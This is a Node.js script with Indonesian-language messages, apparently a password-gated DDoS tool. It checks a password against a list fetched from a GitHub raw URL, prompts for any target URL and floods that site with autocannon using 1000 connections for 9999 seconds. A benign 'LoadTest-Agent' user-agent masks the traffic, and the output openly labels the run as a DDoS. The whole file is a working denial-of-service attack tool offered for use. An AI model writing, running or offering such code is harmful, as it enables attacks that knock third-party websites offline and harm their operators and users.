const autocannon = require('autocannon');
const axios = require('axios');
const chalk = require('chalk');

const color = (text, type) => {
    switch (type) {
        case 'red': return chalk.red(text);
        case 'blue': return chalk.blue(text);
        case 'green': return chalk.green(text);
        default: return text;
    }
};

const DEFAULT_CONNECTIONS = 1000;      
const DEFAULT_DURATION = 9999;  
const pwnya = 'https://raw.githubusercontent.com/adhit2025/elsa/main/database.json';
const mengecekpassword = (password, users) => {
    if (!Array.isArray(users)) return false;
    return users.some(user => user.password === password);
};

async function verifyPassword() {
    try {
        const response = await axios.get(pwnya);
        const data = response.data;

        if (!data.users) {
            console.error('FORMAT DATA SALAH: "users" TIDAK DI TEMUKAN');
            process.exit(1);
        }

        console.log(color('SILAHKAN MASUKKAN PASSWORD:', 'blue'));
        const password = await new Promise((resolve) => {
            process.stdout.write(color('PASSWORD YANG KAMU MASUKKAN: ', 'red'));
            process.stdin.once('data', (data) => resolve(data.toString().trim()));
        });

        if (mengecekpassword(password, data.users)) {
            console.log(color('LOGIN SUKSES', 'green'));
            return true;
        } else {
            console.log(color('PASSWORD SALAH', 'red'));
            process.exit(1);
        }
    } catch (error) {
        console.error('GAGAL MENGAMBIL DATA:', error.message);
        process.exit(1);
    }
}

const runTest = async () => {
    try {
        await verifyPassword();

        const url = await new Promise((resolve) => {
            process.stdout.write('MASUKKAN URL TARGET (contoh: https://example.com): ');
            process.stdin.once('data', (data) => resolve(data.toString().trim()));
        });

        console.log(`\nPROSES DDOS KE ${url} DENGAN ${DEFAULT_CONNECTIONS} SELAMA ${DEFAULT_DURATION} DETIK🚀\n`);

        const instance = autocannon({
            url,
            connections: DEFAULT_CONNECTIONS,
            duration: DEFAULT_DURATION,
            headers: {
                'User-Agent': 'LoadTest-Agent',
            },
        }, (err, res) => {
            if (err) {
                console.error('Error:', err);
            } else {
                console.log('DONE DDOS BY ZALLMACODE RESULT🚀🚀:');
                console.log(res);
            }
        });

        autocannon.track(instance);
    } catch (error) {
        console.error('TERJADI KESALAHAN/EROR:', error.message);
    }
};

runTest();